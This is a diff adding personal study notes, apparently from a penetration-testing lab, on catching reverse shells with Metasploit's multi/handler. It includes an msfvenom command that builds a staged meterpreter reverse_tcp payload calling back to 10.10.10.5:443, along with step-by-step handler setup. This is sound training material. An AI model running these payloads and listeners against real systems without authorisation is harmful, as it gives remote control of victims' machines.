@@ -301,3 +301,26 @@ Q) What command would you use to generate a staged meterpreter reverse shell for
 	msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443
 	
 ## **Metasploit - multi/handler**
+Multi/Handler is a a tool for catching reverse shells. It's essential if you want to use Meterpreter shells, and is the go-to when using staged payloads.
+
+1. Open Metasploit with `msfconsole`
+2. Type `use multi/handler`, and press enter
+
+We are now primed to start a multi/handler session. Let's take a look at the available options using the `options` command:
+![[Pasted image 20240820040051.png]]
+
+There are three options we need to set: payload, LHOST and LPORT. These are all identical to the options we set when generating  shellcode with Msfvenom -- a payload specific to our target, as well as a listening address and port with which we can receive a shell. Note that the LHOST _must_ be specified here, as metasploit will not listen on all network interfaces like netcat or socat will;
+- `set PAYLOAD <payload>`
+- `set LHOST <listen-address>`
+- `set LPORT <listen-port>`
+
+Using the `exploit -j` command it tells Metasploit to launch the module, running as a job in the background.
+![[Pasted image 20240820040300.png]]
+
+Note:
+	You may notice that in the above screenshot, Metasploit is listening on a port under `1024`. To do this, Metasploit _must_ be run with `sudo` permissions.
+
+When the staged payload generated in the previous task is run, Metasploit receives the connection, sending the remainder of the payload and giving us a reverse shell:
+![[Pasted image 20240820040454.png]]
+
+Notice that, because the multi/handler was originally backgrounded, we needed to use `sessions 1` to foreground it again. This worked as it was the only session running. Had there been other sessions active, we would have needed to use `sessions` to see all active sessions
